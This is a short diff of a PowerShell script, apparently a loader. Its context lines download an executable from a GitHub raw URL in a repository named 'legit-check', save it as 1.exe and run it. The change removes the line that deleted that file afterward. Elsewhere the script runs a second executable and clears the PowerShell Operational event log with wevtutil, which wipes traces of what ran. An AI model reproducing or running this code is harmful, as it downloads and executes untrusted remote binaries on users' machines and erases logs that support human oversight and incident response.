@@ -50,7 +50,6 @@ Start-Process powershell -ArgumentList '-NoExit', '-Command', './6.exe; Remove-I
 #InjGen
 Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/jmd.exe" -OutFile "1.exe"
 Invoke-Expression ".\1.exe"
-if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }
 Write-Host ""
 #END
 
@@ -316,3 +315,4 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
